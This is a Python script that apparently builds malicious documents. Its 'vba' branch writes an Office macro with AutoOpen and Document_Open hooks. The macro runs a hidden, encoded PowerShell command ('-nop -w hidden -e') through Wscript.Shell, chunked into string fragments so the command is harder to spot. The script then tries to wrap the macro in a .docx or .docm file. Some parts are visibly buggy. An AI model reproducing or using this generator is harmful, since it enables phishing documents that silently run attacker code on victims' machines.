import random
import subprocess
from docx import Document

def file_creator(extra, extension, final_output):
    filename = ""
    for _ in range(5):
        filename += str(random.randint(1,9))
    
    # .ps1 FILE FOR windows (powershell).
    if extension == 'ps1':
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'Write-Host "{final_output}"\nGet-Process')

    # .bat(batch) FILE FOR windows.
    elif extension == 'bat':
        #TODO: Might need fixing...
        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''@echo off\npowershell -Command "Write-Host '{final_output}'"''')

    # .vba FILE FOR libreoffce, Word,...
    elif extension == 'vba':

        string = f"powershell.exe -nop -w hidden -e {final_output}"
        stripped_string = ""
        n = 50
        for i in range(0, len(string), n):
            stripped_string += "Str = Str + " + '"' + string[i:i+n] + '"\n\t'

        with open(f"{filename}.{extension}", "w") as f:
            f.write(f'''
Sub AutoOpen()
    MyMacro
End Sub

SubDocument_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    {stripped_string}
    CreateObject("Wscript.Shell").Run Str
End Sub
            ''')
    
    # .docx FILE FOR IMBEDDING .vba CONTENT.
    if (extra == 'docx' or extra == 'docm') and (extension == 'vba'):
        doc = Document()     
        doc.add_paragraph('Hello, this is a .docx file created with Linux!')
        doc.save(f'{filename}.odt')
        subprocess.run(['libreoffice', '--headless', '--convert-to', 'docx:"MS Word 2007 XML', f'./{filename}.odt'])
        subprocess.run(['mv', f'./{filename}.docx', f'./{filename}.{extra}'])
    else:
        print("[-] You must specify '-e vba' in combination with '-x docx'")

        
